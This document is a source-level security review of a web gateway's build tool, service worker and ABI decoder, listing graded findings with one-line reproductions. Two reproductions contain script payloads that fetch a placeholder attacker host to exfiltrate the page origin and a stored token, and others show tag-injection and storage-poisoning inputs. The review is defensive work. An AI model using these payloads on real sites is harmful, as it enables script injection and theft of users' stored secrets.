# Independent security review

Review constraints: this was a source-only review of the twelve files in scope. The local tree did not contain an installed `esbuild`, so I could not inspect a generated bundle empirically; the build finding below follows the source-level substitution and HTML parsing path. Per the review instructions, I used no network and did not fetch dependencies.

## Severity scale

- **Critical** — direct, broadly reachable compromise of the gateway or all of its users with little or no prerequisite.
- **High** — cross-security-boundary code/data compromise, or reliable severe resource exhaustion, under a realistic adversarial input.
- **Medium** — meaningful security-policy bypass or availability failure with material prerequisites or limited scope.
- **Low** — bounded resource leakage, robustness failure, or principally self-inflicted/tab-local denial of service.

## Findings

### HIGH — Mixed-case script end tags in build input escape the inline boot script

**Location:** `tools/build.ts:79`

The chains file is parsed as arbitrary JSON, serialized into the boot bundle through `define` at lines 61–65, and then inserted directly into the `<script>` element in `shell.html`. The final escaping step replaces only the case-sensitive byte sequence `</script`. HTML recognizes a script end tag case-insensitively, so an endpoint string containing `</ScRiPt>` is not changed and terminates the boot script even though it occurs inside a JavaScript string literal. Markup following it becomes active content in every generated `index.html` and `404.html`. This executes before contract resolution, so it is more than the already-acknowledged ability of a configured RPC endpoint to lie about a document.

**One-line reproduction:** build with a chains file containing `{"1":["</ScRiPt><script>fetch('https://attacker.invalid/?o='+encodeURIComponent(location.origin))</ScRiPt>"]}` and open the generated page; the second script element is parsed and executed.

### HIGH — Path-selected contracts are not isolated by their prefixes

**Location:** `src/core/target.ts:20` (implemented at `src/core/target.ts:169`; loopback form at `src/core/target.ts:76`)

In the several-chain shape, `pinnedTarget` selects contracts by the first path segment but all resulting documents retain the same origin. A path is not a browser security boundary. Active HTML from any configured chain can read and overwrite the other chains' `localStorage`, `sessionStorage`, IndexedDB, Cache Storage, cookies available to script, BroadcastChannels, and origin-scoped permission state. It can also enumerate and unregister the shared root service-worker registration. A compromise or hostile upgrade of one chain's contract therefore crosses into every other configured chain, notwithstanding the chain prefixes. The unpinned loopback path form has the same property across arbitrary chain/address pairs on that loopback origin; restricting it to loopback prevents a public deployment but does not isolate locally served contracts from one another. The effect is particularly serious for application secrets or authority cached in browser storage.

**One-line reproduction:** after `/1/` stores `localStorage.token`, make the contract configured at `/2/` return `<script>fetch('https://attacker.invalid/?t='+encodeURIComponent(localStorage.token))</script>` from `html()` and visit `/2/`; it reads the chain-1 value.

### HIGH — Aliased ABI header fields amplify the capped response into gigabyte-scale allocations

**Location:** `src/core/abi.ts:116`

The decoder caps the number of headers at 64 and bounds every slice, but it does not cap the cumulative number of bytes decoded into JavaScript strings. ABI offsets may alias. A return value can point all 64 array entries at the same pair and point both fields of that pair at the same multi-megabyte UTF-8 region. `TextDecoder.decode` at lines 120 allocates new key and value strings on every iteration, retaining them in `headers`; subsequent lowercasing and validation add more scanning and potentially more copies. With the default 16 MiB JSON-RPC cap, close to 8 MiB of binary return data can consequently drive about 128 multi-megabyte decodes, enough to terminate the worker or tab. The response-body cap therefore does not bound decoder memory by a comparable amount.

**One-line reproduction:** return valid ABI for 64 headers whose 64 element offsets all name one pair and whose key and value offsets both name the same approximately 8 MiB valid-UTF-8 byte string; `decodeRequestResult` decodes that string 128 times.

### MEDIUM — Inline fallback drops all contract-selected response security policies

**Location:** `src/adapters/sw/boot.ts:39`

When service workers are unavailable, blocked, or registration times out, `renderInline` keeps only the status, content type, and body. It writes an HTML body into the existing static-host response with `document.open/write/close`; none of the response headers produced by `resolve` are applied to that document. On a non-root route, this discards contract-selected `Content-Security-Policy`, `Referrer-Policy`, `Permissions-Policy`, COOP, COEP, CORP, and `X-Frame-Options`, even though the normal worker response applies them. A document whose safety depends on a response-header CSP therefore executes differently precisely on the fallback path. Several of these policies cannot be reproduced completely with markup inside the body.

**One-line reproduction:** with service workers disabled, load `/x` where `request()` returns status 200, `content-type: text/html`, `content-security-policy: script-src 'none'`, and body `<script>document.body.textContent='executed'</script>`; the script executes after `document.write`.

### MEDIUM — Endpoint-list length makes the RPC call deadline unbounded

**Location:** `src/adapters/rpc/fetch.ts:85`

Each endpoint gets a fresh 10-second timeout and endpoints are tried serially. There is no overall deadline and the chains JSON is not validated or capped by `tools/build.ts:25`. Thus build input with a long endpoint array turns a single gateway fetch into a minutes- or hours-long pending operation. Concurrent navigation and subresource requests multiply the pending fetch events and promises. The source comment documents the per-endpoint behavior, but neither service-worker caller imposes the stated whole-list budget.

**One-line reproduction:** build one chain with 1,000 endpoints that accept the request but send no response; one `resolve` call remains pending for approximately 10,000 seconds before returning `upstream`.

### LOW — Non-2xx RPC response bodies are abandoned without cancellation

**Location:** `src/adapters/rpc/fetch.ts:69`

For a successful HTTP status, `readCapped` consumes the body and cancels it on overflow. For a non-2xx status, `callOne` throws immediately without consuming or cancelling `res.body`. A hostile endpoint can send error headers promptly and keep streaming a body while the client has already moved on to the next endpoint. The timeout signal should eventually bound each abandoned fetch at the configured per-endpoint timeout, but concurrent calls can still retain many response streams/connections during that window and bypass the explicit body-size handling.

**One-line reproduction:** make the first endpoint answer `HTTP/1.1 500` with an endless chunked body and the second endpoint answer normally; repeated gateway requests succeed through endpoint two while endpoint-one bodies remain uncancelled until abort/transport cleanup.

### LOW — Unvalidated `sessionStorage` numbers can defeat the reload-attempt bound

**Location:** `src/adapters/sw/boot.ts:23`

Every contract document can write the origin's `sessionStorage`, and multi-chain documents share it. `attempt` accepts `NaN`, infinities, fractions, and negative values as the count. In particular, a stored `NaN:<recent timestamp>` makes `n` become `NaN`; `n + 1` remains `NaN`, and `attempt() >= MAX_ATTEMPTS` is always false. The timestamp is refreshed on every attempt. This defeats the intended two-reload bound on a browser/state where a registered worker repeatedly becomes ready but does not take control. Negative counts similarly extend the bound. The impact is tab-local availability, and normally functioning `clients.claim()` prevents the prerequisite failure state, hence Low severity.

**One-line reproduction:** from a contract document run `sessionStorage.setItem('gw44:boot','NaN:'+Date.now())`, then enter a state where the static boot page reloads without becoming controlled; every boot stores `NaN` again and continues past the two-attempt guard.

## Reviewed surfaces without an additional finding

### URL-to-contract selection and redirects

- The unpinned build's host form takes only a lower-case 20-byte address in the first hostname label and a canonical decimal chain in the second. Its path form is reachable only for the enumerated loopback host forms. Percent-decoding occurs before chain/address validation in path form. I found no path, encoded segment, or shape-confusion route from a pinned build to an unconfigured contract.
- A one-contract pinned build ignores the hostname and treats the entire decoded path as that configured contract's resource. A multi-chain pinned build accepts only a configured decoded first segment; an unknown one throws a local 404 before RPC. `__GW44_PINNED__` is a build constant, so the source selects one parser in each artifact rather than dynamically choosing a shape from the URL.
- All three redirect constructions begin with `/` and the chain inserted into pinned redirects is validated as decimal digits. They preserve the query. Worker redirects preserve fragments through browser navigation, while the boot-page navigation appends the fragment explicitly. I found no way to make these redirects leave the origin or a configured multi-chain prefix.

### Contract status, headers, and active content

- Contract `request()` responses may choose any status from 200 through 599 and arbitrary declared content types. They can intentionally produce executable HTML, JavaScript, SVG, or other active same-origin content; that is equivalent to the contract being the site's publisher, not a separate header-injection issue.
- Header names are reduced to an exact allowlist and values containing controls or non-ASCII bytes are discarded. `Set-Cookie`, `Clear-Site-Data`, `Location`, and `Content-Encoding` other than identity cannot pass. CR/LF response splitting is blocked. The fixed `no-store` and `nosniff` headers remain present. The fallback-policy discrepancy is reported above.
- `html()` bytes and fallback HTML bytes are intentionally installed as a live same-origin document, so a selected contract has script authority for its origin. The cross-chain consequence of giving multiple contracts that authority on one origin is reported above.

### Worker interception

- The fetch listener responds only to same-origin `GET` and `HEAD` requests for which the selected build's target parser finds a target. Cross-origin traffic and non-read methods fall through to the network/static host. Malformed target paths are claimed and become an error response rather than falling through.
- The worker path has no explicit exception: once controlled, an ordinary client fetch of `/gw44-sw.js` is resolved as a contract resource in each shape. Service-worker script/update fetching is specified to bypass service-worker interception, so this does not by itself let that resource replace the installed root worker, although the code comment calling the contract resource “shadowed” describes the reverse of what an ordinary controlled fetch observes.

### RPC and ABI bounds

- The 16 MiB cap is enforced while streaming a successful HTTP response, and the same abort signal spans fetch plus body reading for each endpoint. Endpoints are tried strictly in configuration order; a revert stops failover and is treated as the contract's answer. The aggregate-deadline and non-2xx cleanup issues are reported above.
- ABI integer reads reject nonzero high bytes, unsafe/bad offsets, and truncated words. Body slices are views rather than allocations, header count is capped at 64, and no loop bound is taken unchecked from return data. I found no out-of-bounds read; the remaining resource issue is repeated decoding through legal aliasing, reported above.

### Other build substitutions

- `JSON.stringify` makes chains and pins valid JavaScript expressions for `define`; validated pin chain/address data itself is not a code-injection vector. The unsafe boundary is subsequently embedding the generated boot JavaScript in HTML with a case-sensitive script-end replacement.
